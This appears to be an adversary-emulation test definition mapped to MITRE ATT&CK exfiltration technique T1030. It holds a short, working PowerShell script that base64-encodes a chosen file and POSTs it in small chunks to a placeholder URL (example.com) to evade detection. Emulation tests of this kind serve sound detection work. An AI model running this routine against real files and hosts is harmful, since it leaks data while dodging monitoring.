api_version: "2.0"
name: Network-Based Data Transfer in Small Chunks
description: Simulate transferring data over a network in small chunks to evade detection.
args:
    - name: chunk_size
      type: int
      default: "1024"
    - name: source_file_path
      type: path
      default: '[User specified]'
    - name: destination_url
      type: string
      default: http://example.com
uuid: f0287b58-f4bc-40f6-87eb-692e126e7f8f
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1030: Data Transfer Size Limits'
requirements:
    platforms:
        - os: windows
steps:
    - name: network-based-data-transfer-in-small-chunks
      inline: |
        $file = [System.IO.File]::OpenRead({{.Args.source_file_path}})
        $chunkSize = {{.Args.chunk_size}} * 1KB
        $buffer = New-Object Byte[] $chunkSize

        while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
            $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
            Invoke-WebRequest -Uri {{.Args.destination_url}} -Method Post -Body $encodedChunk
        }
        $file.Close()
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
